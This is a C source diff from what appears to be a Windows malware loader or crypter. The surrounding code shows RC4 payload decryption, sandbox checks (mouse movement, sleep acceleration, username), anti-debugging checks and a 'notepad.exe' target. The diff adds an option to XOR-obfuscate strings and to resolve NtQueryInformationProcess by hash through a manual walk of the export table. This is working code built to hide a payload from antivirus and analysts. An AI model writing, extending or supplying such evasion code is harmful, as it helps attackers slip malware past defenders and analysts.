@@ -71,6 +71,7 @@ typedef struct {
 	unsigned char check_sleep_acceleration;
 	unsigned char check_mouse_movement;
 	unsigned char check_username;
+	unsigned char obfuscate_strings;
 } PatchData;
 #pragma pack(pop)
 
@@ -84,6 +85,7 @@ PatchData patch_data = {
 	{0},
 	0,
 	"notepad.exe",
+	0,
 	0,
 	0,
 	0,
@@ -193,6 +195,56 @@ void decrypt_rc4(unsigned char* data, DWORD size, unsigned char* key, DWORD klen
 	for (n = 0; n < size; n++) { i = (i + 1) % 256; j = (j + S[i]) % 256; t = S[i]; S[i] = S[j]; S[j] = t; data[n] ^= S[(S[i] + S[j]) % 256]; }
 }
 
+#define STR_XOR_KEY 0x7A
+
+#define HASH_NtQueryInformationProcess 0xF4B64BD3
+
+void DecryptString(const unsigned char* encrypted, char* output, DWORD len) {
+	DWORD i;
+	if (patch_data.obfuscate_strings) {
+		for (i = 0; i < len; i++) {
+			output[i] = encrypted[i] ^ STR_XOR_KEY;
+		}
+	} else {
+		for (i = 0; i < len; i++) {
+			output[i] = encrypted[i];
+		}
+	}
+	output[len] = '\0';
+}
+
+DWORD HashString(const char* str) {
+	DWORD hash = 5381;
+	INT c;
+	while ((c = *str++)) {
+		hash = ((hash << 5) + hash) + c;
+	}
+	return hash;
+}
+
+LPVOID GetProcAddressByHash(HMODULE hModule, DWORD hash) {
+	if (!hModule) return NULL;
+
+	PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)hModule;
+	PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)((LPBYTE)hModule + dosHeader->e_lfanew);
+	PIMAGE_EXPORT_DIRECTORY exportDir = (PIMAGE_EXPORT_DIRECTORY)((LPBYTE)hModule +
+		ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
+
+	PDWORD nameRVAs = (PDWORD)((LPBYTE)hModule + exportDir->AddressOfNames);
+	PWORD ordinals = (PWORD)((LPBYTE)hModule + exportDir->AddressOfNameOrdinals);
+	PDWORD funcRVAs = (PDWORD)((LPBYTE)hModule + exportDir->AddressOfFunctions);
+
+	DWORD i;
+	for (i = 0; i < exportDir->NumberOfNames; i++) {
+		char* funcName = (char*)((LPBYTE)hModule + nameRVAs[i]);
+		if (HashString(funcName) == hash) {
+			WORD ordinal = ordinals[i];
+			return (LPVOID)((LPBYTE)hModule + funcRVAs[ordinal]);
+		}
+	}
+	return NULL;
+}
+
 BOOL check_peb_debugged() {
 	typedef struct _PEB {
 		BYTE Reserved1[2];
@@ -209,7 +261,14 @@ BOOL check_debug_port() {
 	if (!hNtdll) return FALSE;
 
 	typedef NTSTATUS (NTAPI *pNtQueryInformationProcess)(HANDLE, DWORD, PVOID, ULONG, PULONG);
-	pNtQueryInformationProcess NtQueryInformationProcess = (pNtQueryInformationProcess)GetProcAddress(hNtdll, "NtQueryInformationProcess");
+	pNtQueryInformationProcess NtQueryInformationProcess;
+
+	if (patch_data.obfuscate_strings) {
+		NtQueryInformationProcess = (pNtQueryInformationProcess)GetProcAddressByHash(hNtdll, HASH_NtQueryInformationProcess);
+	} else {
+		NtQueryInformationProcess = (pNtQueryInformationProcess)GetProcAddress(hNtdll, "NtQueryInformationProcess");
+	}
+
 	if (!NtQueryInformationProcess) return FALSE;
 
 	if (NtQueryInformationProcess(hProcess, 7, &debugPort, sizeof(debugPort), NULL) == 0) {
@@ -225,7 +284,14 @@ BOOL check_debug_object() {
 	if (!hNtdll) return FALSE;
 
 	typedef NTSTATUS (NTAPI *pNtQueryInformationProcess)(HANDLE, DWORD, PVOID, ULONG, PULONG);
-	pNtQueryInformationProcess NtQueryInformationProcess = (pNtQueryInformationProcess)GetProcAddress(hNtdll, "NtQueryInformationProcess");
+	pNtQueryInformationProcess NtQueryInformationProcess;
+
+	if (patch_data.obfuscate_strings) {
+		NtQueryInformationProcess = (pNtQueryInformationProcess)GetProcAddressByHash(hNtdll, HASH_NtQueryInformationProcess);
+	} else {
+		NtQueryInformationProcess = (pNtQueryInformationProcess)GetProcAddress(hNtdll, "NtQueryInformationProcess");
+	}
+
 	if (!NtQueryInformationProcess) return FALSE;
 
 	if (NtQueryInformationProcess(hProcess, 30, &debugObject, sizeof(debugObject), NULL) == 0) {
